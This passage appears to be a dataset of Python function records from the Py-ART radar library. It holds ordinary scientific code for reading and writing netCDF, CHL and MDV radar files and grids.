                kwargs['fill_value'] = fill
    else:
        dtype = data.dtype
    ncvar = dataset.createVariable(name, dtype, dimensions, **kwargs)
    if 'long_name' in dic.keys():
        ncvar.setncattr('long_name', dic['long_name'])
    if 'units' in dic.keys():
        ncvar.setncattr('units', dic['units'])
    for (key, value) in dic.items():
        if key in special_keys.keys():
            continue
        if key in ['data', 'long_name', 'units']:
            continue
        ncvar.setncattr(key, value)
    if data.shape == ():
        data.shape = (1,)
    if data.dtype == 'S1':
        if ncvar.ndim == 1:
            ncvar[:data.shape[-1]] = data[:]
        else:
            ncvar[..., :data.shape[-1]] = data[:]
    else:
        ncvar[:] = data[:]"
ARM-DOE/pyart,_calculate_scale_and_offset,"def _calculate_scale_and_offset(dic, dtype, minimum=None, maximum=None):
    """"""
    Calculate appropriated 'scale_factor' and 'add_offset' for nc variable in
    dic in order to scaling to fit dtype range.

    Parameters
    ----------
    dic : dict
        Radar dictionary containing variable data and meta-data.
    dtype : Numpy Dtype
        Integer numpy dtype to map to.
    minimum, maximum : float
        Greatest and smallest values in the data, those values will be mapped
        to the smallest+1 and greates values that dtype can hold.
        If equal to None, numpy.amin and numpy.amax will be used on the data
        contained in dic to determine these values.

    """"""
    if '_FillValue' in dic:
        fillvalue = dic['_FillValue']
    else:
        fillvalue = np.NaN
    data = dic['data'].copy()
    data = np.ma.array(data, mask=~np.isfinite(data) | (data == fillvalue))
    if minimum is None:
        minimum = np.amin(data)
    if maximum is None:
        maximum = np.amax(data)
    if maximum < minimum:
        raise ValueError(f'Error calculating variable scaling: maximum: {maximum:f} is smaller than minimum: {minimum:f}')
    elif maximum == minimum:
        warnings.warn(f'While calculating variable scaling: maximum: {maximum:f} is equal to minimum: {minimum:f}')
        maximum = minimum + 1
    maxi = np.iinfo(dtype).max
    mini = np.iinfo(dtype).min + 1
    scale = float(maximum - minimum) / float(maxi - mini)
    offset = minimum - mini * scale
    return (scale, offset, np.iinfo(dtype).min)"
ARM-DOE/pyart,__init__,"def __init__(self, ncvar):
    """"""initialize the object.""""""
    self.ncvar = ncvar"
ARM-DOE/pyart,__call__,"def __call__(self):
    """"""Return an array containing data from the stored variable.""""""
    data = self.ncvar[:]
    if data is np.ma.masked:
        self.ncvar.set_auto_mask(False)
        data = np.ma.array(self.ncvar[:], mask=True)
    return np.atleast_1d(data)"
ARM-DOE/pyart,read_chl,"def read_chl(filename, field_names=None, additional_metadata=None, file_field_names=None, exclude_fields=None, include_fields=None, use_file_field_attributes=True, **kwargs):
    """"""
    Read a CSU-CHILL CHL file.

    Parameters
    ----------
    filename : str
        Name of CHL file.
    field_names : dict, optional
        Dictionary mapping CHL field names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the CHL field names for the field names in the radar
        object. If this case the field_names parameter is ignored.
        The field dictionary will likely only have a 'data' key, unless
        the fields are defined in `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `field_file_names` and `field_names` parameters. Set to
        None to include all fields not in exclude_fields.
    use_file_field_attributes : bool, optional
        True to use information provided by in the file to set the field
        attribute `long_name`, `units`, `valid_max`, and `valid_min`. False
        will not set these unless they are defined in the configuration file
        or in `additional_metadata`.

    Returns
    -------
    radar : Radar
        Radar object containing data from CHL file.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('chl', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    chl_file = ChlFile(prepare_for_read(filename))
    time = filemetadata('time')
    tdata = np.array(chl_file.time)
    min_time = np.floor(tdata.min())
    time['data'] = (tdata - min_time).astype('float64')
    time['units'] = make_time_unit_str(datetime.utcfromtimestamp(min_time))
    _range = filemetadata('range')
    _range['data'] = np.array(range(chl_file.ngates)) * chl_file.gate_spacing + chl_file.first_gate_offset
    _range['meters_between_gates'] = np.array(chl_file.gate_spacing)
    _range['meters_to_center_of_first_gate'] = 0.0
    scan_type = SCAN_MODE_NAMES[chl_file.scan_types[-1]]
    fields = {}
    for (i, fdata) in chl_file.fields.items():
        field_info = chl_file.field_info[i]
        field_name = filemetadata.get_field_name(field_info['name'])
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        np.ma.set_fill_value(fdata, get_fillvalue())
        field_dic['data'] = fdata
        field_dic['_FillValue'] = get_fillvalue()
        if use_file_field_attributes:
            field_dic['long_name'] = field_info['descr']
            field_dic['units'] = field_info['units']
            field_dic['valid_max'] = field_info['max_val']
            field_dic['valid_min'] = field_info['min_val']
        fields[field_name] = field_dic
    metadata = filemetadata('metadata')
    metadata['instrument_name'] = chl_file.radar_info['radar_name']
    metadata['original_container'] = 'CHL'
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    latitude['data'] = np.array([chl_file.radar_info['latitude']], 'f8')
    longitude['data'] = np.array([chl_file.radar_info['longitude']], 'f8')
    altitude['data'] = np.array([chl_file.radar_info['altitude']], 'f8')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    fixed_angle = filemetadata('fixed_angle')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_number['data'] = np.arange(chl_file.num_sweeps, dtype='int32')
    sweep_mode['data'] = np.array([SCAN_MODE_NAMES[i] for i in chl_file.scan_types], dtype='S')
    fixed_angle['data'] = np.array(chl_file.fixed_angle, dtype='float32')
    ray_count = chl_file.rays_per_sweep
    ssri = np.cumsum(np.append([0], ray_count[:-1])).astype('int32')
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = np.cumsum(ray_count).astype('int32') - 1
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    azimuth['data'] = np.array(chl_file.azimuth, dtype='float32')
    elevation['data'] = np.array(chl_file.elevation, dtype='float32')
    instrument_parameters = None
    chl_file.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_unpack_structure,"def _unpack_structure(string, structure):
    """"""Unpack a structure.""""""
    fmt = ''.join([i[1] for i in structure])
    tpl = struct.unpack(fmt, string)
    return dict(zip([i[0] for i in structure], tpl))"
ARM-DOE/pyart,__init__,"def __init__(self, filename, ns_time=True, debug=False):
    self.ngates = None
    self.num_sweeps = None
    self.gate_spacing = None
    self.time = []
    self.azimuth = []
    self.elevation = []
    self.fixed_angle = []
    self.sweep_number = []
    self.scan_types = []
    self.rays_per_sweep = None
    self.fields = {}
    self.radar_info = None
    self.field_info = {}
    self.processor_info = None
    self.first_gate_offset = None
    self._dstring = b''
    self._bit_mask = None
    self._dtype = None
    self._ray_bsize = None
    self._packets = []
    self._field_nums = None
    self._rays_in_current_sweep = None
    self._fh = None
    self._include_ns_time = ns_time
    if hasattr(filename, 'read'):
        self._fh = filename
    else:
        self._fh = open(filename, 'rb')
    packet = 1
    while packet is not None:
        packet = self._read_block()
        if debug:
            self._packets.append(packet)
    self._extract_fields()
    self.rays_per_sweep.append(self._rays_in_current_sweep)"
ARM-DOE/pyart,close,"def close(self):
    """"""Close the file.""""""
    self._fh.close()"
ARM-DOE/pyart,_read_block,"def _read_block(self):
    """"""Read a block from an open CHL file.""""""
    pld = self._fh.read(8)
    if pld == b'':
        return None
    (block_id, length) = struct.unpack('<2i', pld)
    payload = self._fh.read(length - 8)
    if block_id == ARCH_ID_FILE_HDR:
        packet = self._parse_file_hdr_block(payload)
    elif block_id == ARCH_ID_FIELD_SCALE:
        packet = self._parse_field_scale_block(payload)
    elif block_id == ARCH_ID_RAY_HDR:
        packet = self._parse_ray_hdr_block(payload)
    elif block_id == HSK_ID_RADAR_INFO:
        packet = self._parse_radar_info_block(payload)
    elif block_id == HSK_ID_PROCESSOR_INFO:
        packet = self._parse_processor_info_block(payload)
    elif block_id == HSK_ID_SCAN_SEG:
        packet = self._parse_scan_seg_block(payload)
    elif block_id == ARCH_ID_SWEEP_BLOCK:
        packet = self._parse_sweep_block(payload)
    else:
        packet = {}
    packet['block_id'] = block_id
    packet['length'] = length
    return packet"
ARM-DOE/pyart,_parse_file_hdr_block,"def _parse_file_hdr_block(self, payload):
    """"""Parse a field_hdr block.""""""
    return _unpack_structure(payload, ARCH_FILE_HDR_T)"
ARM-DOE/pyart,_parse_field_scale_block,"def _parse_field_scale_block(self, payload):
    """"""Parse a field_scale block. Add scale to field_info attr.""""""
    packet = _unpack_structure(payload, FIELD_SCALE_T)
    packet['name'] = packet['name'].decode('utf-8').rstrip('\x00')
    packet['units'] = packet['units'].decode('utf-8').rstrip('\x00')
    packet['descr'] = packet['descr'].decode('utf-8').rstrip('\x00')
    self.field_info[packet['bit_mask_pos']] = packet
    return packet"
ARM-DOE/pyart,_parse_radar_info_block,"def _parse_radar_info_block(self, payload):
    """"""Parse a radar_info block. Update metadata attribute.""""""
    packet = _unpack_structure(payload, RADAR_INFO_T)
    packet['radar_name'] = packet['radar_name'].decode('utf-8').rstrip('\x00')
    self.radar_info = packet.copy()
    return packet"
ARM-DOE/pyart,_parse_processor_info_block,"def _parse_processor_info_block(self, payload):
    """"""Parse a processor_info block. Set dr attribute.""""""
    packet = _unpack_structure(payload, PROCESSOR_INFO)
    self.gate_spacing = packet['gate_spacing']
    self.first_gate_offset = packet['range_offset']
    self.processor_info = packet.copy()
    return packet"
ARM-DOE/pyart,_parse_scan_seg_block,"def _parse_scan_seg_block(self, payload):
    """"""Parse a scan_seg_block. Update sweep attributes.""""""
    packet = _unpack_structure(payload, SCAN_SEG)
    self.sweep_number.append(packet['sweep_num'])
    self.fixed_angle.append(packet['current_fixed_angle'])
    self.scan_types.append(packet['scan_type'])
    if self.rays_per_sweep is None:
        self.rays_per_sweep = []
        self._rays_in_current_sweep = 0
    else:
        self.rays_per_sweep.append(self._rays_in_current_sweep)
        self._rays_in_current_sweep = 0
    return packet"
ARM-DOE/pyart,_parse_sweep_block,"def _parse_sweep_block(self, payload):
    """"""Parse a sweep block. Set num_sweeps attribute.""""""
    packet = {}
    packet['num_sweeps'] = struct.unpack('I', payload[0:4])[0]
    packet['swp_offsets'] = struct.unpack(str(packet['num_sweeps']) + 'Q', payload[4:])
    self.num_sweeps = packet['num_sweeps']
    return packet"
ARM-DOE/pyart,_parse_ray_hdr_block,"def _parse_ray_hdr_block(self, payload):
    """"""Parse a ray_hdr block. Update associated attributes.""""""
    packet = _unpack_structure(payload, ARCH_RAY_HEADER)
    if self._bit_mask is None:
        self.ngates = packet['gates']
        self._bit_mask = packet['bit_mask']
        self._field_nums = [b for b in range(38) if self._bit_mask & 2 ** b]
        self._dtype = ','.join([DATA_FORMAT[self.field_info[i]['format']] for i in self._field_nums])
        self._ray_bsize = np.dtype(self._dtype).itemsize * packet['gates']
    else:
        if packet['bit_mask'] != self._bit_mask:
            raise NotImplementedError('bit_mask is not consistent.')
        if packet['gates'] != self.ngates:
            raise NotImplementedError('number of gates vary.')
    self._dstring += self._fh.read(self._ray_bsize)
    if self._include_ns_time:
        self.time.append(packet['time'] + packet['ns_time'] / 1000000000.0)
    else:
        self.time.append(packet['time'])
    self.azimuth.append(packet['azimuth'])
    self.elevation.append(packet['elevation'])
    self._rays_in_current_sweep += 1
    return packet"
ARM-DOE/pyart,_extract_fields,"def _extract_fields(self):
    """"""Extract field data from _dstring attribute post read.""""""
    all_data = np.frombuffer(self._dstring, dtype=self._dtype)
    all_data = all_data.reshape(-1, self.ngates)
    for (i, field_num) in enumerate(self._field_nums):
        fdata = np.ma.masked_values(all_data[all_data.dtype.names[i]], 0)
        if issubclass(fdata.dtype.type, np.integer):
            dat_factor = float(self.field_info[field_num]['dat_factor'])
            dat_bias = float(self.field_info[field_num]['dat_bias'])
            fld_factor = float(self.field_info[field_num]['fld_factor'])
            fdata = (fdata * dat_factor + dat_bias) / fld_factor
        self.fields[field_num] = fdata
    return"
ARM-DOE/pyart,prepare_for_read,"def prepare_for_read(filename, storage_options={'anon': True}):
    """"""
    Return a file like object read for reading.

    Open a file for reading in binary mode with transparent decompression of
    Gzip and BZip2 files. The resulting file-like object should be closed.

    Parameters
    ----------
    filename : str or file-like object
        Filename or file-like object which will be opened. File-like objects
        will not be examined for compressed data.

    storage_options : dict, optional
        Parameters passed to the backend file-system such as Google Cloud Storage,
        Amazon Web Service S3.

    Returns
    -------
    file_like : file-like object
        File like object from which data can be read.

    """"""
    if hasattr(filename, 'read'):
        return filename
    fh = fsspec.open(filename, mode='rb', compression='infer', **storage_options).open()
    magic = fh.read(3)
    fh.close()
    if magic.startswith(b'\x1f\x8b'):
        return gzip.GzipFile(filename, 'rb')
    if magic.startswith(b'BZh'):
        return bz2.BZ2File(filename, 'rb')
    return fsspec.open(filename, mode='rb', compression='infer', **storage_options).open()"
ARM-DOE/pyart,stringarray_to_chararray,"def stringarray_to_chararray(arr, numchars=None):
    """"""
    Convert an string array to a character array with one extra dimension.

    Parameters
    ----------
    arr : array
        Array with numpy dtype 'SN', where N is the number of characters
        in the string.

    numchars : int
        Number of characters used to represent the string. If numchar > N
        the results will be padded on the right with blanks. The default,
        None will use N.

    Returns
    -------
    chararr : array
        Array with dtype 'S1' and shape = arr.shape + (numchars, ).

    """"""
    carr = netCDF4.stringtochar(arr)
    if numchars is None:
        return carr
    arr_numchars = carr.shape[-1]
    if numchars <= arr_numchars:
        raise ValueError('numchars must be >= %i' % arr_numchars)
    chararr = np.zeros(arr.shape + (numchars,), dtype='S1')
    chararr[..., :arr_numchars] = carr[:]
    return chararr"
ARM-DOE/pyart,_test_arguments,"def _test_arguments(dic):
    """"""Issue a warning if receive non-empty argument dict.""""""
    if dic:
        import warnings
        warnings.warn('Unexpected arguments: %s' % dic.keys())"
ARM-DOE/pyart,make_time_unit_str,"def make_time_unit_str(dtobj):
    """"""Return a time unit string from a datetime object.""""""
    return 'seconds since ' + dtobj.strftime('%Y-%m-%dT%H:%M:%SZ')"
ARM-DOE/pyart,read_grid,"def read_grid(filename, exclude_fields=None, include_fields=None, **kwargs):
    """"""
    Read a netCDF grid file produced by Py-ART.

    Parameters
    ----------
    filename : str
        Filename of netCDF grid file to read. This file must have been
        produced by :py:func:`write_grid` or have identical layout.

    Other Parameters
    ----------------
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.

    Returns
    -------
    grid : Grid
        Grid object containing gridded data.

    """"""
    _test_arguments(kwargs)
    if exclude_fields is None:
        exclude_fields = []
    reserved_variables = ['time', 'x', 'y', 'z', 'origin_latitude', 'origin_longitude', 'origin_altitude', 'point_x', 'point_y', 'point_z', 'projection', 'point_latitude', 'point_longitude', 'point_altitude', 'radar_latitude', 'radar_longitude', 'radar_altitude', 'radar_name', 'radar_time', 'base_time', 'time_offset', 'ProjectionCoordinateSystem']
    dset = netCDF4.Dataset(filename, mode='r')
    metadata = {k: getattr(dset, k) for k in dset.ncattrs()}
    time = _ncvar_to_dict(dset.variables['time'])
    origin_latitude = _ncvar_to_dict(dset.variables['origin_latitude'])
    origin_longitude = _ncvar_to_dict(dset.variables['origin_longitude'])
    origin_altitude = _ncvar_to_dict(dset.variables['origin_altitude'])
    x = _ncvar_to_dict(dset.variables['x'])
    y = _ncvar_to_dict(dset.variables['y'])
    z = _ncvar_to_dict(dset.variables['z'])
    projection = _ncvar_to_dict(dset.variables['projection'])
    projection.pop('data')
    if '_include_lon_0_lat_0' in projection:
        v = projection['_include_lon_0_lat_0']
        projection['_include_lon_0_lat_0'] = {'true': True, 'false': False}[v]
    fields = {}
    field_shape = tuple((len(dset.dimensions[d]) for d in ['z', 'y', 'x']))
    field_shape_with_time = (1,) + field_shape
    field_keys = [k for k in dset.variables if k not in reserved_variables]
    for field in field_keys:
        if field in exclude_fields:
            continue
        if include_fields is not None:
            if field not in include_fields:
                continue
        field_dic = _ncvar_to_dict(dset.variables[field])
        if field_dic['data'].shape == field_shape_with_time:
            field_dic['data'].shape = field_shape
            fields[field] = field_dic
        else:
            bad_shape = field_dic['data'].shape
            warnings.warn(f'Field {field} skipped due to incorrect shape {bad_shape}')
    if 'radar_latitude' in dset.variables:
        radar_latitude = _ncvar_to_dict(dset.variables['radar_latitude'])
    else:
        radar_latitude = None
    if 'radar_longitude' in dset.variables:
        radar_longitude = _ncvar_to_dict(dset.variables['radar_longitude'])
    else:
        radar_longitude = None
    if 'radar_altitude' in dset.variables:
        radar_altitude = _ncvar_to_dict(dset.variables['radar_altitude'])
    else:
        radar_altitude = None
    if 'radar_name' in dset.variables:
        radar_name = _ncvar_to_dict(dset.variables['radar_name'])
    else:
        radar_name = None
    if 'radar_time' in dset.variables:
        radar_time = _ncvar_to_dict(dset.variables['radar_time'])
    else:
        radar_time = None
    dset.close()
    return Grid(time, fields, metadata, origin_latitude, origin_longitude, origin_altitude, x, y, z, projection=projection, radar_latitude=radar_latitude, radar_longitude=radar_longitude, radar_altitude=radar_altitude, radar_name=radar_name, radar_time=radar_time)"
ARM-DOE/pyart,write_grid,"def write_grid(filename, grid, format='NETCDF4', include_fields=None, write_proj_coord_sys=True, proj_coord_sys=None, arm_time_variables=False, arm_alt_lat_lon_variables=False, write_point_x_y_z=False, write_point_lon_lat_alt=False):
    """"""
    Write a Grid object to a CF-1.5 and ARM standard netCDF file.

    To control how the netCDF variables are created, set any of the following
    keys in the grid attribute dictionaries.

        * _Zlib
        * _DeflateLevel
        * _Shuffle
        * _Fletcher32
        * _Continguous
        * _ChunkSizes
        * _Endianness
        * _Least_significant_digit
        * _FillValue

    See the netCDF4 documentation for details on these settings.

    Parameters
    ----------
    filename : str
        Filename to save grid to.
    grid : Grid
        Grid object to write.
    format : str, optional
        netCDF format, one of 'NETCDF4', 'NETCDF4_CLASSIC',
        'NETCDF3_CLASSIC' or 'NETCDF3_64BIT'. See netCDF4 documentation for
        details.
    include_fields : list, optional
        Fields to write out to NETCDF file. Default is None and will include
        all fields from the original grid object.
    write_proj_coord_sys bool, optional
        True to write information on the coordinate transform used in the map
        projection to the ProjectionCoordinateSystem variable following the CDM
        Object Model. The resulting file should be interpreted as containing
        geographic grids by tools which use the Java NetCDF library
        (THREDDS, toolsUI, etc).
    proj_coord_sys : dict or None, optional
        Dictionary of parameters which will be written to the
        ProjectionCoordinateSystem NetCDF variable if write_proj_coord_sys is
        True. A value of None will attempt to generate an appropriate
        dictionary by examining the projection attribute of the grid object.
        If the projection is not understood a warnings will be issued.
    arm_time_variables : bool, optional
        True to write the ARM standard time variables base_time and
        time_offset. False will not write these variables.
    arm_alt_lat_lon_variables : bool, optional
        True to write the ARM standard alt, lat, lon variables.
        False will not write these variables.
    write_point_x_y_z : bool, optional
        True to include the point_x, point_y and point_z variables in the
        written file, False will not write these variables.
    write_point_lon_lat_alt : bool, optional
        True to include the point_longitude, point_latitude and point_altitude
        variables in the written file, False will not write these variables.

    """"""
    dset = netCDF4.Dataset(filename, mode='w', format=format)
    dset.createDimension('time', None)
    dset.createDimension('z', grid.nz)
    dset.createDimension('y', grid.ny)
    dset.createDimension('x', grid.nx)
    if grid.nradar != 0:
        dset.createDimension('nradar', grid.nradar)
        if grid.radar_name is not None:
            lenlist = []
            for rname in grid.radar_name['data']:
                lenlist.append(len(rname))
            lenlist.append(1)
            nradar_str_length = np.max(lenlist)
            dset.createDimension('nradar_str_length', nradar_str_length)
    _create_ncvar(grid.time, dset, 'time', ('time',))
    _create_ncvar(grid.x, dset, 'x', ('x',))
    _create_ncvar(grid.y, dset, 'y', ('y',))
    _create_ncvar(grid.z, dset, 'z', ('z',))
    _create_ncvar(grid.origin_latitude, dset, 'origin_latitude', ('time',))
    _create_ncvar(grid.origin_longitude, dset, 'origin_longitude', ('time',))
    _create_ncvar(grid.origin_altitude, dset, 'origin_altitude', ('time',))
    projection = grid.projection.copy()
    projection['data'] = np.array(1, dtype='int32')
    if '_include_lon_0_lat_0' in projection:
        include = projection['_include_lon_0_lat_0']
        projection['_include_lon_0_lat_0'] = ['false', 'true'][include]
    _create_ncvar(projection, dset, 'projection', ())
    if write_proj_coord_sys:
        if proj_coord_sys is None:
            proj_coord_sys = _make_coordinatesystem_dict(grid)
        if proj_coord_sys is None:
            warnings.warn('Cannot determine ProjectionCoordinateSystem parameter for the given projection, the file will not be written without this information.')
        else:
            proj_coord_sys['data'] = np.array(1, dtype='int32')
            _create_ncvar(proj_coord_sys, dset, 'ProjectionCoordinateSystem', ())
    radar_attr_names = ['radar_latitude', 'radar_longitude', 'radar_altitude', 'radar_time']
    for attr_name in radar_attr_names:
        attr = getattr(grid, attr_name)
        if attr is not None:
            _create_ncvar(attr, dset, attr_name, ('nradar',))
    if grid.radar_name is not None:
        _create_ncvar(grid.radar_name, dset, 'radar_name', ('nradar', 'nradar_str_length'))
    if arm_time_variables:
        time = grid.time
        dt = netCDF4.num2date(time['data'][0], time['units'])
        td = dt - datetime.datetime.utcfromtimestamp(0)
        td = td.seconds + td.days * 24 * 3600
        base_time = {'data': np.array([td], dtype=np.int32), 'string': dt.strftime('%d-%b-%Y,%H:%M:%S GMT'), 'units': 'seconds since 1970-1-1 0:00:00 0:00', 'ancillary_variables': 'time_offset', 'long_name': 'Base time in Epoch'}
        _create_ncvar(base_time, dset, 'base_time', ())
        time_offset = {'data': np.array(time['data'], dtype=np.float64), 'long_name': 'Time offset from base_time', 'units': time['units'].replace('T', ' ').replace('Z', ''), 'ancillary_variables': 'time_offset', 'calendar': 'gregorian'}
        _create_ncvar(time_offset, dset, 'time_offset', ('time',))
    if arm_alt_lat_lon_variables:
        alt = {'data': np.array([grid.origin_altitude['data']], dtype=np.float64), 'standard_name': 'Altitude', 'units': 'm', 'long_name': 'Altitude above mean sea level'}
        _create_ncvar(alt, dset, 'alt', ())
        lat = {'data': np.array([grid.origin_latitude['data']], dtype=np.float64), 'standard_name': 'Latitude', 'units': 'degree_N', 'long_name': 'North Latitude', 'valid_min': -90.0, 'valid_max': 90.0}
        _create_ncvar(lat, dset, 'lat', ())
        lon = {'data': np.array([grid.origin_longitude['data']], dtype=np.float64), 'standard_name': 'Longitude', 'units': 'degree_E', 'long_name': 'East Longitude', 'valid_min': -180.0, 'valid_max': 180.0}
        _create_ncvar(lon, dset, 'lon', ())
    if write_point_x_y_z:
        _create_ncvar(grid.point_x, dset, 'point_x', ('z', 'y', 'x'))
        _create_ncvar(grid.point_y, dset, 'point_y', ('z', 'y', 'x'))
        _create_ncvar(grid.point_z, dset, 'point_z', ('z', 'y', 'x'))
    if write_point_lon_lat_alt:
        dims = ('z', 'y', 'x')
        _create_ncvar(grid.point_latitude, dset, 'point_latitude', dims)
        _create_ncvar(grid.point_longitude, dset, 'point_longitude', dims)
        _create_ncvar(grid.point_altitude, dset, 'point_altitude', dims)
    field_check = 0
    if include_fields is not None:
        for (field, field_dic) in grid.fields.items():
            if field in include_fields:
                field_check += 1
                field_dic['data'].shape = (1,) + field_dic['data'].shape
                _create_ncvar(field_dic, dset, field, ('time', 'z', 'y', 'x'))
                field_dic['data'].shape = field_dic['data'].shape[1:]
            else:
                continue
        if field_check == 0:
            warnings.warn('No new fields were added, as no field matches were made. Please check that field names in the include fields list match up with field names in the radar object.', UserWarning)
    else:
        for (field, field_dic) in grid.fields.items():
            field_dic['data'].shape = (1,) + field_dic['data'].shape
            _create_ncvar(field_dic, dset, field, ('time', 'z', 'y', 'x'))
            field_dic['data'].shape = field_dic['data'].shape[1:]
    for (k, v) in grid.metadata.items():
        setattr(dset, k, v)
    if 'Conventions' not in dset.ncattrs():
        dset.setncattr('Conventions', 'PyART_GRID-1.1')
    dset.close()
    return"
ARM-DOE/pyart,_make_coordinatesystem_dict,"def _make_coordinatesystem_dict(grid):
    """"""
    Return a dictionary containing parameters for a coordinate transform.

    Examine the grid projection attribute and other grid attributes to
    return a dictionary containing parameters which can be written to a netCDF
    variable to specify a horizontal coordinate transform recognized by
    Unidata's CDM. Return None when the projection defined in the grid
    cannot be mapped to a CDM coordinate transform.
    """"""
    projection = grid.projection
    origin_latitude = grid.origin_latitude['data'][0]
    origin_longitude = grid.origin_longitude['data'][0]
    cdm_transform = {'latitude_of_projection_origin': origin_latitude, 'longitude_of_projection_origin': origin_longitude, '_CoordinateTransformType': 'Projection', '_CoordinateAxes': 'x y z time', '_CoordinateAxesTypes': 'GeoX GeoY Height Time'}
    if projection['proj'] == 'ortho':
        cdm_transform['grid_mapping_name'] = 'orthographic'
    elif projection['proj'] == 'laea':
        cdm_transform['grid_mapping_name'] = 'lambert_azimuthal_equal_area'
    elif projection['proj'] in ['aeqd', 'pyart_aeqd']:
        cdm_transform['grid_mapping_name'] = 'azimuthal_equidistant'
        cdm_transform['semi_major_axis'] = 6370997.0
        cdm_transform['inverse_flattening'] = 298.25
        cdm_transform['longitude_of_prime_meridian'] = 0.0
        cdm_transform['false_easting'] = 0.0
        cdm_transform['false_northing'] = 0.0
    elif projection['proj'] == 'tmerc':
        cdm_transform['grid_mapping_name'] = 'transverse_mercator'
        cdm_transform['longitude_of_central_meridian'] = origin_longitude
        cdm_transform['scale_factor_at_central_meridian'] = 1.0
    elif projection['proj'] == 'lcc':
        cdm_transform['grid_mapping_name'] = 'lambert_conformal_conic'
        cdm_transform['standard_parallel'] = origin_latitude
        cdm_transform['longitude_of_central_meridian'] = origin_longitude
    elif projection['proj'] == 'aea':
        cdm_transform['grid_mapping_name'] = 'albers_conical_equal_area'
        cdm_transform['standard_parallel'] = origin_latitude
        cdm_transform['longitude_of_central_meridian'] = origin_longitude
    elif projection['proj'] == 'stere':
        cdm_transform['grid_mapping_name'] = 'stereographic'
        cdm_transform['scale_factor_at_projection_origin'] = 1.0
    elif projection['proj'] in ['npstere', 'spstere']:
        cdm_transform['grid_mapping_name'] = 'polar_stereographic'
        cdm_transform['standard_parallel'] = origin_latitude
    else:
        cdm_transform = None
    return cdm_transform"
ARM-DOE/pyart,_decode_rle8,"def _decode_rle8(compr_data, key, decompr_size):
    """"""Decode 8-bit MDV run length encoding.""""""
    data = np.frombuffer(compr_data, dtype='>B')
    out = np.empty((decompr_size,), dtype='uint8')
    data_ptr = 0
    out_ptr = 0
    while data_ptr != len(data):
        v = data[data_ptr]
        if v != key:
            out[out_ptr] = v
            data_ptr += 1
            out_ptr += 1
        else:
            count = data[data_ptr + 1]
            value = data[data_ptr + 2]
            out[out_ptr:out_ptr + count] = value
            data_ptr += 3
            out_ptr += count
    return out.tobytes()"
ARM-DOE/pyart,__init__,"def __init__(self, filename, debug=False, read_fields=False):
    """"""initalize""""""
    if debug:
        print('Opening file for reading: ', filename)
    if filename is None:
        self.fileptr = None
    elif hasattr(filename, 'read'):
        self.fileptr = filename
    else:
        self.fileptr = open(filename, 'rb')
    if debug:
        print('Getting master header')
    self.master_header = self._get_master_header()
    if debug:
        print('getting field headers')
    nfields = self.master_header['nfields']
    self.field_headers = self._get_field_headers(nfields)
    if debug:
        print('getting vlevel headers')
    self.vlevel_headers = self._get_vlevel_headers(nfields)
    if debug:
        print('getting chunk headers')
    nchunks = self.master_header['nchunks']
    self.chunk_headers = self._get_chunk_headers(nchunks)
    if debug:
        print('Getting Chunk Data')
    self.chunk_data = [None] * self.master_header['nchunks']
    (self.radar_info, self.elevations, self.calib_info) = self._get_chunks(debug)
    if self.master_header['nfields'] > 0:
        projections = {PROJ_LATLON: 'latlon', PROJ_LAMBERT_CONF: 'lambert_conform', PROJ_POLAR_STEREO: 'polar_stereographic', PROJ_FLAT: 'flat', PROJ_POLAR_RADAR: 'ppi', PROJ_OBLIQUE_STEREO: 'oblique_stereographic', PROJ_RHI_RADAR: 'rhi'}
        self.projection = projections[self.field_headers[0]['proj_type']]
    if debug:
        print('Making usable time objects')
    self.times = self._make_time_dict()
    if debug:
        print('indexing fields')
    self.fields = self._make_fields_list()
    self.fields_data = [None] * self.master_header['nfields']
    if read_fields:
        if debug:
            print('Reading all fields')
        self.read_all_fields()
    return"
ARM-DOE/pyart,write,"def write(self, filename, debug=False):
    """"""
        Write object data to a MDV file.

        Note that the file is not explicitly closes, use x.close() to
        close file object when complete.

        Parameters
        ----------
        filename : str or file-like
            Filename or open file object to which data will be written.
        debug : bool, options
            True to print out debugging information, False to supress.

        """"""
    if debug:
        print('Opening file for writing:', filename)
    if hasattr(filename, 'write'):
        self.fileptr = filename
    else:
        self.fileptr = open(filename, 'wb')
    file_start = self.fileptr.tell()
    headers_size = 1024 + (416 + 1024) * self.master_header['nfields'] + 512 * self.master_header['nchunks']
    self.fileptr.write(b'\x00' * headers_size)
    if debug:
        print('Writing Fields Data')
    for ifield in range(self.master_header['nfields']):
        self._write_a_field(ifield)
    if debug:
        print('Writing Chunk Data')
    self._write_chunks(debug)
    self._calc_file_offsets()
    self.fileptr.seek(file_start)
    if debug:
        print('Writing master header')
    self._write_master_header()
    if debug:
        print('Writing field headers')
    self._write_field_headers(self.master_header['nfields'])
    if debug:
        print('Writing vlevel headers')
    self._write_vlevel_headers(self.master_header['nfields'])
    if debug:
        print('Writing chunk headers')
    self._write_chunk_headers(self.master_header['nchunks'])"
